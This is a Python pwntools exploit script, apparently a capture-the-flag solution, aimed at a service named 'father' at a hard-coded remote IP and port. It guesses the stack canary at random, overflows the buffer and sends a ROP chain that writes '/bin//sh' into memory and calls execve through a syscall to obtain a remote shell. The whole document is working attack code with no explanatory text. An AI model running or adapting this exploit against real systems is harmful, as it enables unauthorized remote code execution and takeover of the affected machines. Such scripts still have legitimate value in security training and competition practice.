#!/usr/bin/env python3
from pwn import *
import pwnlib.log
from struct import pack
import random
context.arch = 'amd64'
#context.log_level = 'debug'

r = remote('140.115.59.7', 10011)
#r = process('./father')

p = b'' # ROP chain
p += pack('<Q', 0x0000000000410893) # pop rsi ; ret
p += pack('<Q', 0x00000000006d50e0) # @ .data
p += pack('<Q', 0x00000000004005cf) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000488931) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410893) # pop rsi ; ret
p += pack('<Q', 0x00000000006d50e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000488931) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004006c6) # pop rdi ; ret
p += pack('<Q', 0x00000000006d50e0) # @ .data
p += pack('<Q', 0x0000000000410893) # pop rsi ; ret
p += pack('<Q', 0x00000000006d50e8) # @ .data + 8
p += pack('<Q', 0x0000000000449ce5) # pop rdx ; ret
p += pack('<Q', 0x00000000006d50e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004005cf) # pop rax ; ret
p += p64(59)                        # execve
p += pack('<Q', 0x00000000004013ec) # syscall

def dropmenu():
    r.recvline()
    r.recvline()
    r.recvline()

def create(msg):
    r.sendline(str(1))
    r.recvline()
    r.recvline()
    r.sendline(str(msg))

def show():
    r.sendline(str(2))

def stop(msg):
    r.sendline(str(3))
    r.recvuntil('my children !!!!!')
    r.sendline(str(msg))

success('ROP chain lenth %s' % hex(len(p)))
cnt = 1
dropmenu()

while True:
    canary = p8(0)
    for i in range(7):
        cur = random.randint(0x0, 0xff)
        canary+= p8(cur)
    payload = b'\x00'*(0x28)
    payload+= canary
    payload+= p64(0) # ret addr
    create(payload)
    msg = r.recvline()
    if b'smashing' in msg:
        dropmenu()
        log.failure('#{} failed attempt with canary {}'.format(str(cnt), str(canary)))
        cnt+= 1
        continue
    else:
        r.recvline()
        r.recvline()
        break
# failed (time out)
success('#{} tries, found canary {}'.format(str(cnt), str(canary)))
r.interactive()
input('>')
payload = b'\x00'*(0x28) # offset -8
payload+= canary
payload+= p64(0)
payload+= p
stop(payload)

r.interactive()
r.close()
